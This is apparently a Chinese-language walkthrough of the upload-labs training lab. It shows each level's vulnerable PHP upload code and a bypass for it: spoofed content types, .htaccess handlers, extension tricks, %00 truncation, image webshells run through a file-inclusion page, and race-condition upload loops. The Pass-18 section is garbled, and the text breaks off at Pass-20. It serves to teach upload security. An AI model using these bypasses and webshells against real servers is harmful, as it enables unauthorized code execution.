https://github.com/c0ny1/upload-labs

参考

https://blog.csdn.net/weixin_44426869/article/details/104236854#t3
https://xz.aliyun.com/t/2435
https://www.cnblogs.com/Lmg66/p/13272575.html?utm_source=tuicool
https://blog.csdn.net/weixin_44677409/article/details/92799366#t17


文件上传漏洞练习

![](https://lmg66.github.io/img/3.png)

![](https://img-blog.csdnimg.cn/2019110311215233.png)

## Pass-01 客户端js检查

源码：

    <script type="text/javascript">
        function checkFile() {
            var file = document.getElementsByName('upload_file')[0].value;
            if (file == null || file == "") {
                alert("请选择要上传的文件!");
                return false;
            }
            //定义允许上传的文件类型
            var allow_ext = ".jpg|.png|.gif";
            //提取上传文件的类型
            var ext_name = file.substring(file.lastIndexOf("."));
            //判断上传文件类型是否允许上传
            if (allow_ext.indexOf(ext_name) == -1) {
                var errMsg = "该文件不允许上传，请上传" + allow_ext + "类型的文件,当前文件类型为：" + ext_name;
                alert(errMsg);
                return false;
            }
        }
    </script>

客户端js检查，打开F12可以看到页面上有js代码，可以直接修改不调用该js或者修改js满足类型需求，也可以在上传时bp修改类型。

## Pass-02 MIME-Type验证

源码

    $is_upload = false;
    $msg = null;
    if (isset($_POST['submit'])) {
        if (file_exists(UPLOAD_PATH)) {
            if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) {
                $temp_file = $_FILES['upload_file']['tmp_name'];
                $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name']            
                if (move_uploaded_file($temp_file, $img_path)) {
                    $is_upload = true;
                } else {
                    $msg = '上传出错！';
                }
            } else {
                $msg = '文件类型不正确，请重新上传！';
            }
        } else {
            $msg = UPLOAD_PATH.'文件夹不存在,请手工创建！';
        }
    }

MIME-Type介绍：

    MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。

仅仅判断content-type类型，因此上传1.php抓包修改content-type为图片类型：image/jpeg、image/png、image/gif

## Pass-03 黑名单验证，后缀名

源码：

    $is_upload = false;
    $msg = null;
    if (isset($_POST['submit'])) {
        if (file_exists(UPLOAD_PATH)) {
            $deny_ext = array('.asp','.aspx','.php','.jsp');
            $file_name = trim($_FILES['upload_file']['name']);
            $file_name = deldot($file_name);//删除文件名末尾的点
            $file_ext = strrchr($file_name, '.');
            $file_ext = strtolower($file_ext); //转换为小写
            $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA，php在window的时候如果文件名+"::$DATA"会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持"::$DATA"之前的文件名
            $file_ext = trim($file_ext); //收尾去空

            if(!in_array($file_ext, $deny_ext)) {
                $temp_file = $_FILES['upload_file']['tmp_name'];
                $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;            
                if (move_uploaded_file($temp_file,$img_path)) {
                    $is_upload = true;
                } else {
                    $msg = '上传出错！';
                }
            } else {
                $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！';
            }
        } else {
            $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
        }
    }

用黑名单不允许上传.asp,.aspx,.php,.jsp后缀的文件，但可以上传.phtml .phps .php5 .pht

前提是apache的httpd.conf中有如下配置代码，才可以解析

    AddType application/x-httpd-php .php .phtml .phps .php5 .pht

因此抓包修改为1.php5上传，回复包里有上传路径。

## Pass-04 黑名单 .htaccess绕过

源码

    $is_upload = false;
    $msg = null;
    if (isset($_POST['submit'])) {
        if (file_exists(UPLOAD_PATH)) {
            $deny_ext = array(".php",".php5",".php4",".php3",".php2","php1",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2","pHp1",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf");
            $file_name = trim($_FILES['upload_file']['name']);
            $file_name = deldot($file_name);//删除文件名末尾的点
            $file_ext = strrchr($file_name, '.');
            $file_ext = strtolower($file_ext); //转换为小写
            $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
            $file_ext = trim($file_ext); //收尾去空

            if (!in_array($file_ext, $deny_ext)) {
                $temp_file = $_FILES['upload_file']['tmp_name'];
                $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
                if (move_uploaded_file($temp_file, $img_path)) {
                    $is_upload = true;
                } else {
                    $msg = '上传出错！';
                }
            } else {
                $msg = '此文件不允许上传!';
            }
        } else {
            $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
        }
    }


黑名单拒绝了几乎所有有问题的后缀名，禁止的有点多，除了.htaccess

htaccess文件介绍：htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。前提条件（1.mod_rewrite模块开启。2.AllowOverride All）

因此先上传一个.htaccess文件，内容如下：

    SetHandler application/x-httpd-php 

设置当前目录所有文件都使用PHP解析，那么无论上传任何文件，只要文件内容符合PHP语言代码规范，就会被当作PHP执行。不符合则报错。

再上传图片马即可。

## Pass-05 大小写绕过

源码

    $is_upload = false;
    $msg = null;
    if (isset($_POST['submit'])) {
        if (file_exists(UPLOAD_PATH)) {
            $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
            $file_name = trim($_FILES['upload_file']['name']);
            $file_name = deldot($file_name);//删除文件名末尾的点
            $file_ext = strrchr($file_name, '.');
            $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
            $file_ext = trim($file_ext); //首尾去空

            if (!in_array($file_ext, $deny_ext)) {
                $temp_file = $_FILES['upload_file']['tmp_name'];
                $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
                if (move_uploaded_file($temp_file, $img_path)) {
                    $is_upload = true;
                } else {
                    $msg = '上传出错！';
                }
            } else {
                $msg = '此文件类型不允许上传！';
            }
        } else {
            $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
        }
    }

相比于pass-4，过滤了.htaccess，但将后缀转换为小写去掉了，因此可以使用大小绕过

大小写绕过原理：

    Windows系统下，对于文件名中的大小写不敏感。例如：test.php和TeSt.PHP是一样的。
    Linux系统下，对于文件名中的大小写敏感。例如：test.php和 TesT.php就是不一样的。

## Pass-06 空格绕过

源码：

    $is_upload = false;
    $msg = null;
    if (isset($_POST['submit'])) {
        if (file_exists(UPLOAD_PATH)) {
            $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
            $file_name = $_FILES['upload_file']['name'];
            $file_name = deldot($file_name);//删除文件名末尾的点
            $file_ext = strrchr($file_name, '.');
            $file_ext = strtolower($file_ext); //转换为小写
            $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
            
            if (!in_array($file_ext, $deny_ext)) {
                $temp_file = $_FILES['upload_file']['tmp_name'];
                $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
                if (move_uploaded_file($temp_file,$img_path)) {
                    $is_upload = true;
                } else {
                    $msg = '上传出错！';
                }
            } else {
                $msg = '此文件不允许上传';
            }
        } else {
            $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
        }
    }

相比于前两题，这题没有对后缀名进行去空，因此可以在后缀名加空格绕过

原理:windows等系统下，文件后缀加空格命名之后是默认自动删除空格。查看网站源代码发现过滤了大小写，没用过滤空格。

## Pass-07 点绕过

源码:

    $is_upload = false;
    $msg = null;
    if (isset($_POST['submit'])) {
        if (file_exists(UPLOAD_PATH)) {
            $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
            $file_name = trim($_FILES['upload_file']['name']);
            $file_ext = strrchr($file_name, '.');
            $file_ext = strtolower($file_ext); //转换为小写
            $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
            $file_ext = trim($file_ext); //首尾去空
            
            if (!in_array($file_ext, $deny_ext)) {
                $temp_file = $_FILES['upload_file']['tmp_name'];
                $img_path = UPLOAD_PATH.'/'.$file_name;
                if (move_uploaded_file($temp_file, $img_path)) {
                    $is_upload = true;
                } else {
                    $msg = '上传出错！';
                }
            } else {
                $msg = '此文件类型不允许上传！';
            }
        } else {
            $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
        }
    }

原理:同空格绕过原理一样，主要原因是windows等系统默认删除文件后缀的.,可在后缀名中加”.”绕过

## Pass-08 ::$DATA绕过

源码：

    $is_upload = false;
    $msg = null;
    if (isset($_POST['submit'])) {
        if (file_exists(UPLOAD_PATH)) {
            $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
            $file_name = trim($_FILES['upload_file']['name']);
            $file_name = deldot($file_name);//删除文件名末尾的点
            $file_ext = strrchr($file_name, '.');
            $file_ext = strtolower($file_ext); //转换为小写
            $file_ext = trim($file_ext); //首尾去空
            
            if (!in_array($file_ext, $deny_ext)) {
                $temp_file = $_FILES['upload_file']['tmp_name'];
                $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
                if (move_uploaded_file($temp_file, $img_path)) {
                    $is_upload = true;
                } else {
                    $msg = '上传出错！';
                }
            } else {
                $msg = '此文件类型不允许上传！';
            }
        } else {
            $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
        }
    }

没有对后缀名中的’::$DATA’进行过滤。在php+windows的情况下：如果文件名+"::$DATA"会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持"::$DATA"之前的文件名。

利用windows特性，可在后缀名中加” ::$DATA”绕过。

## Pass-09 点空格绕过

源码：

    $is_upload = false;
    $msg = null;
    if (isset($_POST['submit'])) {
        if (file_exists(UPLOAD_PATH)) {
            $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
            $file_name = trim($_FILES['upload_file']['name']);
            $file_name = deldot($file_name);//删除文件名末尾的点
            $file_ext = strrchr($file_name, '.');
            $file_ext = strtolower($file_ext); //转换为小写
            $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
            $file_ext = trim($file_ext); //首尾去空
            
            if (!in_array($file_ext, $deny_ext)) {
                $temp_file = $_FILES['upload_file']['tmp_name'];
                $img_path = UPLOAD_PATH.'/'.$file_name;
                if (move_uploaded_file($temp_file, $img_path)) {
                    $is_upload = true;
                } else {
                    $msg = '上传出错！';
                }
            } else {
                $msg = '此文件类型不允许上传！';
            }
        } else {
            $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
        }
    }

原理:查看源码发现，都过滤但是，点和空格只是过滤了1次，所以我们可以尝试构造.php. .这样就只是过滤了文件末尾的点而没有过滤第一个点，文件后缀变成了.php.实现了文件的上传。

## Pass-10 双写绕过

源码：

    $is_upload = false;
    $msg = null;
    if (isset($_POST['submit'])) {
        if (file_exists(UPLOAD_PATH)) {
            $deny_ext = array("php","php5","php4","php3","php2","html","htm","phtml","pht","jsp","jspa","jspx","jsw","jsv","jspf","jtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","swf","htaccess");

            $file_name = trim($_FILES['upload_file']['name']);
            $file_name = str_ireplace($deny_ext,"", $file_name);
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.$file_name;        
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
        }
    }


原理:查看源码发现，没有过滤点，空格，大写等，估计这种不是放在windows下的，看源码发现str_ireplace这个函数将php，php5，php4等后缀变成空格，且只执行了一次，所以可以尝试构造文件后缀为pphphp绕过。

## Pass-11 %00截断 get传输

源码

    $is_upload = false;
    $msg = null;
    if(isset($_POST['submit'])){
        $ext_arr = array('jpg','png','gif');
        $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],".")+1);
        if(in_array($file_ext,$ext_arr)){
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = $_GET['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;

            if(move_uploaded_file($temp_file,$img_path)){
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else{
            $msg = "只允许上传.jpg|.png|.gif类型文件！";
        }
    }

原理:查看源码发现使用了白名单，只允许jpg，png，gif文件的上传，发现路径img_path函数是让文件位置(save_path)加时间随机数(rand)的方法生成文件位置和文件名称

所以这里我们可以尝试在save_path的地方使用%00的方法截断后面的语句，burpsuite抓包发现，是可以更改save_path的

不过此方法有使用的限制。使用限制:

    1、php版本小于5.3.4
    2、php.ini的magic_quotes_gpc为OFF状态。 (magic_quotes_gpc)函数的的底层实现是类似c语言，所以可以%00截断

！[](https://lmg66.github.io/img/34.png)

## Pass-12 %00截断 post传输

源码

    $is_upload = false;
    $msg = null;
    if(isset($_POST['submit'])){
        $ext_arr = array('jpg','png','gif');
        $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],".")+1);
        if(in_array($file_ext,$ext_arr)){
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = $_POST['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;

            if(move_uploaded_file($temp_file,$img_path)){
                $is_upload = true;
            } else {
                $msg = "上传失败";
            }
        } else {
            $msg = "只允许上传.jpg|.png|.gif类型文件！";
        }
    }

post传输和get传输差不多，但因为POST不会像GET对%00进行自动解码,需要转一下码（或者在二进制中修改）,如图，然后发送发现上传成功。

![](https://lnng.top/img/36.png)

![](https://lnng.top/img/37.png)

## Pass-13 图片马 文件包含利用

源码

    function getReailFileType($filename){
        $file = fopen($filename, "rb");
        $bin = fread($file, 2); //只读2字节
        fclose($file);
        $strInfo = @unpack("C2chars", $bin);    
        $typeCode = intval($strInfo['chars1'].$strInfo['chars2']);    
        $fileType = '';    
        switch($typeCode){      
            case 255216:            
                $fileType = 'jpg';
                break;
            case 13780:            
                $fileType = 'png';
                break;        
            case 7173:            
                $fileType = 'gif';
                break;
            default:            
                $fileType = 'unknown';
            }    
            return $fileType;
    }

    $is_upload = false;
    $msg = null;
    if(isset($_POST['submit'])){
        $temp_file = $_FILES['upload_file']['tmp_name'];
        $file_type = getReailFileType($temp_file);

        if($file_type == 'unknown'){
            $msg = "文件未知，上传失败！";
        }else{
            $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").".".$file_type;
            if(move_uploaded_file($temp_file,$img_path)){
                $is_upload = true;
            } else {
                $msg = "上传出错！";
            }
        }
    }

制作图片马：

    >copy 1.jpg /b + 1.txt /a shell.jpg

1.txt中的内容为一句话木马，1.jpg则是一张图片。生成的图片马是shell.jpg。

其他制作图片马方法：

    1、右键图片选择属性，详细信息，版权处加入木马。

    2、edjpg软件
    将图片直接拖到edjpg.exe上，在弹出窗口内输入一句话木马即可。

    3、十六进制编辑器编辑添加
    用010 Editor或winhex等十六进制编辑器打开图片，将一句话木马插入到右边最底层或最上层后保存。

顺利的上传图片马，图片名会重新命名，所以burp上传，记得看一下。直接访问图片并不能把图片当做PHP解析，因此还需要利用文件包含漏洞

利用include.php实现文件包含（自带有）：

    <?php
    /*
    本页面存在文件包含漏洞，用于测试图片马是否能正常运行！
    */
    header("Content-Type:text/html;charset=utf-8");
    $file = $_GET['file'];
    if(isset($file)){
        include $file;
    }else{
        show_source(__file__);
    }
    ?>

http://127.0.0.1/include.php?file=./upload/7120210518080656.jpg

## Pass-14 图片马 getimagesize() 文件包含利用

源码

    function isImage($filename){
        $types = '.jpeg|.png|.gif';
        if(file_exists($filename)){
            $info = getimagesize($filename);
            $ext = image_type_to_extension($info[2]);
            if(stripos($types,$ext)){
                return $ext;
            }else{
                return false;
            }
        }else{
            return false;
        }
    }

    $is_upload = false;
    $msg = null;
    if(isset($_POST['submit'])){
        $temp_file = $_FILES['upload_file']['tmp_name'];
        $res = isImage($temp_file);
        if(!$res){
            $msg = "文件未知，上传失败！";
        }else{
            $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").$res;
            if(move_uploaded_file($temp_file,$img_path)){
                $is_upload = true;
            } else {
                $msg = "上传出错！";
            }
        }
    }

getimagesize()函数，用于取得图像大小，如果指定的图像或其不是有效的图像，getimagesize()将返回false并产生一条E_WARNING级的错误

Image_type_to_extension()，用于取得图像类型的文件后缀

这题是用getimagesize函数判断文件类型，还是可以图片马绕过，方法同pass-13

## Pass-15 图片马 exif_imagetype() 文件包含利用

源码

    function isImage($filename){
        //需要开启php_exif模块
        $image_type = exif_imagetype($filename);
        switch ($image_type) {
            case IMAGETYPE_GIF:
                return "gif";
                break;
            case IMAGETYPE_JPEG:
                return "jpg";
                break;
            case IMAGETYPE_PNG:
                return "png";
                break;    
            default:
                return false;
                break;
        }
    }

    $is_upload = false;
    $msg = null;
    if(isset($_POST['submit'])){
        $temp_file = $_FILES['upload_file']['tmp_name'];
        $res = isImage($temp_file);
        if(!$res){
            $msg = "文件未知，上传失败！";
        }else{
            $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").".".$res;
            if(move_uploaded_file($temp_file,$img_path)){
                $is_upload = true;
            } else {
                $msg = "上传出错！";
            }
        }
    }

exif_imagetype()函数，用于判断一个图像的类型，正常则返回签名对应常量，否则返回false

这里用到php_exif模块来判断文件类型，用图片马绕过，方法同pass-13

## Pass-16 图片马 二次渲染绕过

源码

    $is_upload = false;
    $msg = null;
    if (isset($_POST['submit'])){
        // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径
        $filename = $_FILES['upload_file']['name'];
        $filetype = $_FILES['upload_file']['type'];
        $tmpname = $_FILES['upload_file']['tmp_name'];

        $target_path=UPLOAD_PATH.basename($filename);

        // 获得上传文件的扩展名
        $fileext= substr(strrchr($filename,"."),1);

        //判断文件后缀与类型，合法才进行上传操作
        if(($fileext == "jpg") && ($filetype=="image/jpeg")){
            if(move_uploaded_file($tmpname,$target_path))
            {
                //使用上传的图片生成新的图片
                $im = imagecreatefromjpeg($target_path);

                if($im == false){
                    $msg = "该文件不是jpg格式的图片！";
                    @unlink($target_path);
                }else{
                    //给新图片指定文件名
                    srand(time());
                    $newfilename = strval(rand()).".jpg";
                    $newimagepath = UPLOAD_PATH.$newfilename;
                    imagejpeg($im,$newimagepath);
                    //显示二次渲染后的图片（使用用户上传图片生成的新图片）
                    $img_path = UPLOAD_PATH.$newfilename;
                    @unlink($target_path);
                    $is_upload = true;
                }
            } else {
                $msg = "上传出错！";
            }

        }else if(($fileext == "png") && ($filetype=="image/png")){
            if(move_uploaded_file($tmpname,$target_path))
            {
                //使用上传的图片生成新的图片
                $im = imagecreatefrompng($target_path);

                if($im == false){
                    $msg = "该文件不是png格式的图片！";
                    @unlink($target_path);
                }else{
                    //给新图片指定文件名
                    srand(time());
                    $newfilename = strval(rand()).".png";
                    $newimagepath = UPLOAD_PATH.$newfilename;
                    imagepng($im,$newimagepath);
                    //显示二次渲染后的图片（使用用户上传图片生成的新图片）
                    $img_path = UPLOAD_PATH.$newfilename;
                    @unlink($target_path);
                    $is_upload = true;               
                }
            } else {
                $msg = "上传出错！";
            }

        }else if(($fileext == "gif") && ($filetype=="image/gif")){
            if(move_uploaded_file($tmpname,$target_path))
            {
                //使用上传的图片生成新的图片
                $im = imagecreatefromgif($target_path);
                if($im == false){
                    $msg = "该文件不是gif格式的图片！";
                    @unlink($target_path);
                }else{
                    //给新图片指定文件名
                    srand(time());
                    $newfilename = strval(rand()).".gif";
                    $newimagepath = UPLOAD_PATH.$newfilename;
                    imagegif($im,$newimagepath);
                    //显示二次渲染后的图片（使用用户上传图片生成的新图片）
                    $img_path = UPLOAD_PATH.$newfilename;
                    @unlink($target_path);
                    $is_upload = true;
                }
            } else {
                $msg = "上传出错！";
            }
        }else{
            $msg = "只允许上传后缀为.jpg|.png|.gif的图片文件！";
        }
    }


判断了后缀名、content-type，以及利用imagecreatefromgif判断是否为gif图片，最后再做了一次二次渲染，具体可以参考 https://xz.aliyun.com/t/2657#toc-13

imagecreatefrom 系列函数用于从文件或 URL 载入一幅图像，成功返回图像资源，失败则返回一个空字符串

imagexxx — 以 xxx 格式将图像输出到浏览器或文件

这里使用容易绕过二次渲染的gif文件。现在制作一个gif图片马，copy就可以了。也可以winhex制作。制作后便上传，发现无法利用。然后将上传的图片重新下载下来，放入winhex，进行对比。可以找到二次渲染后不变的地方，而这个地方就是可以插入一句话的地方。上传修改好的图片马。

![](https://img2020.cnblogs.com/blog/1884723/202004/1884723-20200416151903312-918773678.png)

## Pass-17 条件竞争

源码

    $is_upload = false;
    $msg = null;

    if(isset($_POST['submit'])){
        $ext_arr = array('jpg','png','gif');
        $file_name = $_FILES['upload_file']['name'];
        $temp_file = $_FILES['upload_file']['tmp_name'];
        $file_ext = substr($file_name,strrpos($file_name,".")+1);
        $upload_file = UPLOAD_PATH . '/' . $file_name;

        if(move_uploaded_file($temp_file, $upload_file)){
            if(in_array($file_ext,$ext_arr)){
                $img_path = UPLOAD_PATH . '/'. rand(10, 99).date("YmdHis").".".$file_ext;
                rename($upload_file, $img_path);
                $is_upload = true;
            }else{
                $msg = "只允许上传.jpg|.png|.gif类型文件！";
                unlink($upload_file);
            }
        }else{
            $msg = '上传出错！';
        }
    }


这里是条件竞争，先将文件上传到服务器，然后判断文件后缀是否在白名单里，如果在则通过rename重命名，否则通过unlink删除

因此我们可以上传shell.php只需要在它删除之前访问即可，可以利用burp的intruder模块（重放攻击）不断上传，然后我们不断的访问刷新该地址即可。

先创建一个shell.php，内容为

    <?php
        fputs(fopen('phpinfo.php','w'),'<?php phpinfo(); ?>');
    ?>

再使用python不断请求

    import requests
    url = "http://127.0.0.1/upload/shell.php"
    while True:
        html = requests.get(url)
        if html.status_code == 200:
            print("OK")
            break
        else:
            print("NO")

运行python代码，再用burpsuite-intruder模块批量模拟上传shell.php文件，Tips:intruder模块中，payload选择Null payloads，并且可以选择无限重复，线程也可以根据实际情况加大。

若是脚本结果出现ok，则说明访问到了shell.php，并且生成了phpinfo.php，可以访问到 http://127.0.0.1/upload/phpinfo.php

如果不写脚本，也可以利用burpsuite-intruder模块一并模拟访问包，或者直接浏览器刷新。


## Pass-18 条件竞争

源码"shell_phpinfo.jpg
    {
        require_once("./myupload.php");
        $imgFileName =time();
        $u = new MyUpload($_FILES['upload_file']['name'], $_FILES['upload_file']['tmp_name'], $_FILES['upload_file']['size'],$imgFileName);
        $status_code = $u->upload(UPLOAD_PATH);
        switch ($status_code) {
            case 1:
                $is_upload = true;
                $img_path = $u->cls_upload_dir . $u->cls_file_rename_to;
                break;
            case 2:
                $msg = '文件已经被上传，但没有重命名。';
                break; 
            case -1:
                $msg = '这个文件不能上传到服务器的临时文件存储目录。';
                break; 
            case -2:
                $msg = '上传失败，上传目录不可写。';
                break; 
            case -3:
                $msg = '上传失败，无法上传该类型文件。';
                break; 
            case -4:
                $msg = '上传失败，上传的文件过大。';
                break; 
            case -5:
                $msg = '上传失败，服务器已经存在相同名称文件。';
                break; 
            case -6:
                $msg = '文件无法上传，文件不能复制到目标目录。';
                break;      
            default:
                $msg = '未知错误！';
                break;
        }
    }

    //myupload.php
    class MyUpload{
    ......
    ......
    ...... 本关对文件后缀名做了白名单判断，然后会一步一步检查文件大小、文件是否存在等等，将文件上传后，对文件重新命名，同样存在条件竞争的漏洞。可以不断利用burp发送上传图片马的数据包，由于条件竞争，程序会出现来不及rename的问题，从而上传成功：
    **
    ** Method to upload the file.
    ** This is the only method to call outside the class.
    ** @para String name of directory we upload to
    ** @returns void
    **/
    function upload( $dir ){
        "shell_phpinfo.jpg
        return $this->resultUpload( $ret );
        }

        $ret = $this->setDir( $dir );
        if( $ret != 1 ){
        return $this->resultUpload( $ret );
        }

        $ret = $this->checkExtension();
        if( $ret != 1 ){
        return $this->resultUpload( $ret );
        }

        $ret = $this->checkSize();
        if( $ret != 1 ){
        return $this->resultUpload( $ret );    
        }
        
        // if flag to check if the file exists is set to 1
        
        if( $this->cls_file_exists == 1 ){
        
        $ret = $this->checkFileExists();
        if( $ret != 1 ){
            return $this->resultUpload( $ret );    
        }
        }

        // if we are here, we are ready to move the file to destination

        $ret = $this->move();
        if( $ret != 1 ){
        return $this->resultUpload( $ret );    
        }

        // check if we need to rename the file

        if( $this->cls_rename_file == 1 ){
        $ret = $this->renameFile();
        if( $ret != 1 ){
            return $this->resultUpload( $ret );    
        }
        }
        
        // if we are here, everything worked as planned :)

        return $this->resultUpload( "SUCCESS" );
    
    }
    ......
    ......
    ...... 
    };

本关对文件后缀名做了白名单判断，然后会一步一步检查文件大小、文件是否存在等等，将文件上传后，对文件重新命名，同样存在条件竞争的漏洞。可以不断利用burp发送上传图片马的数据包，由于条件竞争，程序会出现来不及rename的问题，从而上传成功。

题目bug，index.php中 $status_code = $u->upload(UPLOAD_PATH); 改成 $status_code = $u->upload(UPLOAD_PATH+“/”);

制作图片马shell_phpinfo.jpg，图片马作用是生成phpinfo.php

    <?php fputs(fopen('phpinfo.php','w'),'<?php phpinfo(); ?>');?>

编写脚本1.py

    import requests
    url = "http://127.0.0.1/upload/shell_phpinfo.jpg"
    while True:
        html = requests.get(url)
        if html.status_code == 200:
            print("OK")
            break
        else:
            print("NO")

同Pass-18，运行1.py,bp重放攻击，可以访问竞争到shell_phpinfo.jpg文件

再文件包含利用，编写脚本2.py

    import requests
    url = "http://127.0.0.1/include.php?file=./upload/shell_phpinfo.jpg"
    while True:
        html = requests.get(url)
        if 'phpinfo()' in html.text:
            print("OK")
            break
        else:
            print("NO")

运行2.py,bp重放攻击，生成了phpinfo.php

## Pass-19 /.绕过

源码

    $is_upload = false;
    $msg = null;
    if (isset($_POST['submit'])) {
        if (file_exists(UPLOAD_PATH)) {
            $deny_ext = array("php","php5","php4","php3","php2","html","htm","phtml","pht","jsp","jspa","jspx","jsw","jsv","jspf","jtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","swf","htaccess");

            $file_name = $_POST['save_name'];
            $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);

            if(!in_array($file_ext,$deny_ext)) {
                $temp_file = $_FILES['upload_file']['tmp_name'];
                $img_path = UPLOAD_PATH . '/' .$file_name;
                if (move_uploaded_file($temp_file, $img_path)) { 
                    $is_upload = true;
                }else{
                    $msg = '上传出错！';
                }
            }else{
                $msg = '禁止保存为该类型文件！';
            }

        } else {
            $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
        }
    }

绕过姿势：Pathinfo()会返回一个关联数组含有path的信息。例如：

![](https://lnng.top/img/66.png)

save_name=shell.php/.这样file_ext值为空绕过黑名单，而move_uploaded_file函数忽略文件后的./就可以实现保存文件为shell.php

直接加一个.号也可以绕过

![](https://lmg66.github.io/img/67.png)

## Pass-20

源码

    $is_upload = false;
    $msg = null;
    if(!empty($_FILES['upload_file'])){
        //检查MIME
        $allow_type = array('image/jpeg','image/png','image/gif');
        if(!in_array($_FILES['upload_file']['type'],$allow_type)){
            $msg = "禁止上传该类型文件!";
        }else{
            //检查文件名
            $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name'];
